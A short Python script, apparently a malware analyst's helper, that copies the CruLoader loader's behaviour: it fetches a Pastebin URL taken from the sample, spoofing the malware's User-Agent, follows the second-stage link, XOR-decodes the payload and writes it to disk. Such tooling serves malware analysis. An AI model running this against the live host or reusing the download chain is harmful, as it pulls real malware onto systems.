#!/usr/bin/env python3

#Todo brute XOR instead of static hex value, possibly using malduck Yara
#Todo 2 trim de-XOR:ed MZ file. For now I am piping the download payload througth the tool "cut-bytes.py '[4D5A90]':" from Didier Stevens.

import requests
import malduck

#URL found in CruLoader sample
url = 'https://pastebin.com/raw/mLem9DGk'

#Change the User-Agent to look less suspicius
headers = {
    'User-Agent': 'cruloader'
}

r = requests.get(f'{url}', headers=headers)

first_response = r.content.decode('utf-8')

#Parse the data from the Pastebin webpage and send a new request
new_url = first_response
n = requests.get(f'{new_url}', headers=headers)
payload = n.content

# De-XOR payload
key = 0x61
payload = payload
decrypted = malduck.xor(key, payload)

# Write payload to disk
with open ("payload.bin", 'wb') as o:
	o.write(decrypted)

